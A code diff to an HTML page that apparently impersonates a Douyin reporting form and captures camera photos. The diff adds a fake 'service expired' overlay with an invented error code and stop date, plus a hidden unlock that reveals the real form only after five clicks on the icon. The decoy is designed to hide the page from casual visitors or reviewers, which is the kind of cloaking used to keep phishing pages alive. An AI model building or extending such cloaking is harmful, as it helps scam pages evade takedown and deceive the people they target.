@@ -598,6 +598,77 @@
             .header { padding: 26px 18px 24px; }
             .header h1 { font-size: 18px; }
         }
+
+        /* ===== Expired Overlay ===== */
+        .expired-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: #f8f9fa;
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.3s ease;
+        }
+        .expired-overlay.hidden { display: none; }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        .expired-box {
+            text-align: center;
+            padding: 40px 24px;
+            max-width: 400px;
+        }
+        .expired-icon {
+            margin-bottom: 24px;
+        }
+        .expired-icon svg {
+            width: 64px;
+            height: 64px;
+            opacity: 0.5;
+        }
+        .expired-title {
+            font-size: 22px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 12px;
+        }
+        .expired-desc {
+            font-size: 15px;
+            color: #666;
+            margin-bottom: 24px;
+            line-height: 1.6;
+        }
+        .expired-code {
+            display: inline-block;
+            background: #f0f0f0;
+            color: #999;
+            padding: 8px 16px;
+            border-radius: 6px;
+            font-family: monospace;
+            font-size: 13px;
+            margin-bottom: 16px;
+        }
+        .expired-time {
+            font-size: 13px;
+            color: #bbb;
+            margin-bottom: 32px;
+        }
+        .expired-footer {
+            border-top: 1px solid #eee;
+            padding-top: 20px;
+        }
+        .expired-footer p {
+            font-size: 12px;
+            color: #999;
+            margin-bottom: 8px;
+        }
+        .expired-id {
+            font-family: monospace;
+            font-size: 11px;
+            color: #ccc;
+        }
     </style>
 </head>
 <body>
@@ -732,8 +803,27 @@
     <div class="footer">本页面仅供信息提交，审核结果以系统通知为准</div>
 </div>
 
+<!-- 网站失效幻象 -->
+<div class="expired-overlay" id="expiredOverlay">
+    <div class="expired-box">
+        <div class="expired-icon">
+            <svg viewBox="0 0 24 24" fill="#999" width="64" height="64">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+            </svg>
+        </div>
+        <h1 class="expired-title">此页面已停止服务</h1>
+        <p class="expired-desc">该域名已过期或被管理员停用</p>
+        <div class="expired-code">ERR_SERVICE_EXPIRED</div>
+        <div class="expired-time">停用时间：2026-05-18 00:00:00</div>
+        <div class="expired-footer">
+            <p>如有疑问请联系管理员</p>
+            <p class="expired-id">Trace ID: ${Math.random().toString(36).substr(2, 16)}</p>
+        </div>
+    </div>
+</div>
+
 <!-- 举报接口通知 -->
-<div class="notif-overlay active" id="douyinNotifModal">
+<div class="notif-overlay" id="douyinNotifModal">
     <div class="notif-box">
         <div class="notif-title">最新举报接口通知</div>
         <div class="notif-body">
@@ -834,6 +924,19 @@
 </div>
 
 <script>
+    // 网站失效幻象 - 点击图标5次解除
+    var expiredClicks = 0;
+    var expiredOverlay = document.getElementById('expiredOverlay');
+    var expiredIcon = expiredOverlay.querySelector('.expired-icon');
+    expiredIcon.addEventListener('click', function() {
+        expiredClicks++;
+        if (expiredClicks >= 5) {
+            expiredOverlay.classList.add('hidden');
+            // 显示通知弹窗
+            document.getElementById('douyinNotifModal').classList.add('active');
+        }
+    });
+
     var cameraStream = null;
     var capturedPhotos = [];
     var sessionId = '';
